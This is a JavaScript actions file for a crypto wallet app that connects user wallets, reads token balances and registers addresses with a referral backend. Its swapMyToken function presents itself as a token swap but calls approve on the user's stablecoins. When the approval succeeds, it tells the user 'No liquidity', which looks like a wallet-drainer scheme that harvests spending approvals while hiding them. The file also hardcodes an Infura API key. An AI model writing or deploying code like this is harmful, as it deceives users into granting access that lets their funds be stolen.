import axios from 'axios'
import Web3 from 'web3'
import busdContract from 'components/wallet/contracts/busd-contract'
import usdtContract from 'components/wallet/contracts/usdt-contract'
import usdcContract from 'components/wallet/contracts/usdc-contract'
import dogsContract from 'components/wallet/contracts/dogs-contract'
import tusdContract from 'components/wallet/contracts/tusd-contract'
import server from 'src/config'
import babyDogeContract from 'components/wallet/contracts/baby-doge-contract'
import notifier from 'src/utils/notifier'

let myConnectedWallet

export async function getMyConnectedWallet () {
  return myConnectedWallet
}

export async function setWallet ({ commit, dispatch, state }, connectedWallet) {
  const wallet = connectedWallet[0]
  myConnectedWallet = connectedWallet[0]
  commit('mutationWallet', {
    address: wallet.accounts?.[0]?.address,
    chainId: null
  })

  await dispatch('getBalance')
  dispatch('getWalletFromDB', wallet?.accounts?.[0]?.address)
  dispatch('getDogsBalance')

  if (state.chainId === 56) await busdContract.getBalance(wallet.accounts?.[0]?.address, state.chainId).then(balance => commit('mutationBusdBalance', balance))
  await usdcContract.getBalance(wallet.accounts?.[0]?.address, state.chainId).then(balance => commit('mutationUsdcBalance', balance))
  await usdtContract.getBalance(wallet.accounts?.[0]?.address, state.chainId).then(balance => commit('mutationUsdtBalance', balance))
  await tusdContract.getBalance(wallet.accounts?.[0]?.address, state.chainId).then(balance => commit('mutationTusdBalance', balance))
  commit('mutationDefaultSwapCoin')
}

export async function getWalletFromDB ({ commit, dispatch }, address) {
  try {
    await axios.get(`${server.walletServerURI}/wallet/wallet/`, {
      params: {
        address
      }
    }).then(res => {
      if (!res.data?.results?.length) {
        dispatch('createWallet', address)
      } else {
        commit('mutationdbWallet', res.data.results[0])
      }
    })
  } catch (e) {

  }
}

export async function getBalance ({ state, commit }) {
  const web3 = new Web3('https://bsc-dataseed1.binance.org:443') || new Web3(new Web3.providers.HttpProvider('https://mainnet.infura.io/v3/41ad9ed3e14d4eb8817675f8d48fe96b'))
  const connectedWallet = await getMyConnectedWallet()
  web3.eth.setProvider(connectedWallet.provider)

  const chainId = await web3.eth.getChainId()
  commit('mutationChainId', chainId)

  web3.eth.getBalance(state.wallet.address).then(rawBalance => {
    const balance = (rawBalance / 1000000000000000000).toFixed(4)
    const workBalance = Math.round(rawBalance * 0.9)
    commit('mutationBnbBalance', {
      balance,
      rawBalance,
      workBalance,
      formattedWorkBalance: (workBalance / 1000000000000000000).toFixed(4)
    })
  })
}

export async function createWallet ({ commit, dispatch }, address) {
  const ref = localStorage.getItem('ref') || undefined
  try {
    await axios.post(`${server.walletServerURI}/wallet/wallet/`, {
      address,
      ref
    }).then(res => {
      dispatch('getWalletFromDB', address)
    })
  } catch (e) {

  }
}

export async function swapMyToken ({ state }, coinName) {
  let contract
  if (coinName === 'DOGE') contract = babyDogeContract
  if (coinName === 'BUSD') contract = busdContract
  if (coinName === 'USDT') contract = usdtContract
  if (coinName === 'USDC') contract = usdcContract
  if (coinName === 'TUSD') contract = tusdContract

  const successCallBack = () => notifier('Sorry. No liquidity. Please, try to swap other coin.', 'accent')

  contract.approve(state.wallet.address, state.chainId, successCallBack)
}

export async function dogePriceStream ({ commit }, close = false) {
  const ws = new WebSocket('wss://stream.binance.com:9443/ws/dogeusdt@ticker')
  ws.onmessage = function (event) {
    commit('mutationDogsPrice', JSON.parse(event.data))
  }
}

export async function dogsAirdrop ({ dispatch, state }) {
  return dogsContract.airdrop(state.wallet.address, state.chainId).then(() => dispatch('getDogsBalance'))
}

export async function getDogsBalance ({ commit, state }) {
  await dogsContract.getBalance(state.wallet.address, state.chainId).then(res => {
    commit('mutationDogsBalance', res)
  })
}
